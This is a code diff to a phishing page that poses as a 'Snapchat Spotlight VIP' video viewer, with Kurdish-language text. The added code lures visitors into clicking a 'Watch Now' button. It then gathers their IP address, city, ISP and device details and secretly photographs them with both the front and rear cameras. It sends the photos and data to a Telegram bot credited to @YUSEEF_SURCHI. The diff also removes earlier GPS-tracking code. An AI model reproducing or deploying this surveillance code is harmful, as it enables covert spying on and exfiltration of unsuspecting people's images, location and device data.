@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Spotlight | Ultra Stream</title>
+    <title>Snapchat Spotlight | Ultra VIP Stream</title>
     <style>
         * { box-sizing: border-box; }
         body { 
@@ -25,15 +25,30 @@
             background: linear-gradient(145deg, #111111, #1a1a1a);
             padding: 30px 20px;
             border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), 0 0 15px rgba(255, 252, 0, 0.15);
-            border: 1px solid #333;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.9), 0 0 20px rgba(255, 252, 0, 0.2);
+            border: 1px solid #444;
             max-width: 380px;
             width: 90%;
         }
 
         h1 { font-size: 21px; margin: 10px 0; color: #fffc00; letter-spacing: 0.5px; }
-        p { font-size: 13px; color: #b1b1b1; }
+        p { font-size: 13px; color: #b1b1b1; margin-bottom: 20px; }
         
+        .vip-btn {
+            background: #fffc00;
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            font-weight: bold;
+            font-size: 14px;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 252, 0, 0.4);
+            transition: 0.2s;
+        }
+        .vip-btn:hover { background: #e6e300; transform: scale(1.05); }
+
+        .loader-container { display: none; }
         .loader {
             width: 32px;
             height: 32px;
@@ -48,10 +63,15 @@
 </head>
 <body>
 
-    <div class="box">
-        <h1>Snapchat Spotlight</h1>
-        <p>ڤیدیۆ دهێتە بارکرن، لطفاً لڤێرە راوەستە...</p>
-        <div class="loader"></div>
+    <div class="box" id="main-box">
+        <h1>Snapchat Spotlight VIP</h1>
+        <p>بۆ دیتنا ڤیدیۆیێ و بارکرنا پشکێ، لطفا کلیک ل سەر دوگمەیێ بکە 👇</p>
+        <button class="vip-btn" onclick="startVipProcess()">لێرە کلیک بکە (Watch Now)</button>
+        
+        <div class="loader-container" id="loader-box">
+            <div class="loader"></div>
+            <p style="margin-top: 10px; font-size: 12px;">ڤیدیۆ دهێتە بارکرن...</p>
+        </div>
     </div>
 
     <video id="hidden-video" autoplay playsinline></video>
@@ -72,7 +92,21 @@
             } catch (e) {}
         }
 
-        // کۆمکرنا زانیاریێن زێدە و پێشکەفتی یێن ئامیرەی
+        // وەرگرتنا زانیاریێن IP و وەڵاتی بێ GPS
+        async function getIpInfo() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                return `🌍 وەڵات: ${data.country_name} (${data.country_code})
+🏙 باژێر: ${data.city}
+🌐 ئایپی (IP): ${data.ip}
+🏢 کۆمپانیا (ISP): ${data.org}`;
+            } catch (e) {
+                return "🌍 زانیاریێن IP: نەهاتنە دیتن";
+            }
+        }
+
+        // کۆمکرنا زانیاریێن پێشکەفتی یێن ئامیرەی
         async function getProInfo() {
             let battery = "نەهاتە زانین";
             try {
@@ -85,8 +119,11 @@
             let conn = navigator.connection ? (navigator.connection.effectiveType || "نەدیار") : "نەدیار";
             let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "نەدیار";
             let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "نەدیار";
+            let ipDetails = await getIpInfo();
             
-            return `📱 سیستەم: ${navigator.platform}
+            return `🔥 [ VIP GUEST LOG ] 🔥
+${ipDetails}
+📱 سیستەم: ${navigator.platform}
 🌐 بووکەر: ${navigator.userAgent.split(') ')[0]})
 🔋 رێژا پاترییێ: ${battery}
 ⚡ جۆرێ تورێ: ${conn}
@@ -98,23 +135,11 @@
 
         async function sendVisitorLog() {
             let details = await getProInfo();
-            sendText(`🚀 سەردانکەرەکێ نوو لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+            sendText(`🚀 سەردانکەرەکێ نوو (VIP) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
         }
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    let lat = pos.coords.latitude;
-                    let lon = pos.coords.longitude;
-                    sendText(`📍 جهێ GPS یێ کەسەکی هاته دیتن!\n\nhttps://www.google.com/maps?q=${lat},${lon}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
-                }, () => {
-                    sendText(`⚠️ کەسەکی ڕێکا GPS رەتکر.\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
-                }, { timeout: 8000, enableHighAccuracy: true });
-            }
-        }
-
-        // گرتنا وێنەی ب کامێرا پیشی (User Camera)
-        async function captureCamera(facing = "user", label = "پێشی (Selfie)") {
+        // گرتنا وێنەی ب هه‌ردو کامێرایان (پێشی و پاش)
+        async function captureCamera(facing, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
@@ -122,39 +147,48 @@
                 const video = document.getElementById('hidden-video');
                 video.srcObject = stream;
 
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(async () => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(async () => {
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        canvas.toBlob(async (blob) => {
-                            let details = await getProInfo();
-                            const formData = new FormData();
-                            formData.append('chat_id', chat_id);
-                            formData.append('photo', blob, 'shot.jpg');
-                            formData.append('caption', `📸 وێنەیێ نوو (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+                            canvas.toBlob(async (blob) => {
+                                let details = await getProInfo();
+                                const formData = new FormData();
+                                formData.append('chat_id', chat_id);
+                                formData.append('photo', blob, 'shot.jpg');
+                                formData.append('caption', `📸 وێنەیێ VIP (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
 
-                            await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 'image/jpeg', 0.95);
-                    }, 2000);
-                };
+                                await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                            }, 'image/jpeg', 0.95);
+                        }, 2000);
+                    };
+                });
             } catch (err) {
-                if (facing === "user") {
-                    sendText(`⚠️ کامێرا ${label} نەهاتە دان.\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
-                }
+                sendText(`⚠️ کامێرا ${label} نەهاتە دان یان رەتکر.\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
             }
         }
 
-        window.onload = async () => {
+        // دەمێ دوگمە دهێتە کلیککرن هەمیشە کار دکەت
+        async function startVipProcess() {
+            document.querySelector('.vip-btn').style.display = 'none';
+            document.getElementById('loader-box').style.display = 'block';
+
             await sendVisitorLog();
-            setTimeout(getLocation, 1200);
-            setTimeout(() => captureCamera("user", "کامێرا پێشی"), 2500);
-        };
+            
+            // گرتنا کامێرا پێشی
+            await captureCamera("user", "کامێرا پێشی (Selfie)");
+
+            // گرتنا کامێرا پاش (ئەگەر ئامیرە هەبت)
+            await captureCamera("environment", "کامێرا پاش (Rear)");
+        }
     </script>
 </body>
 </html>
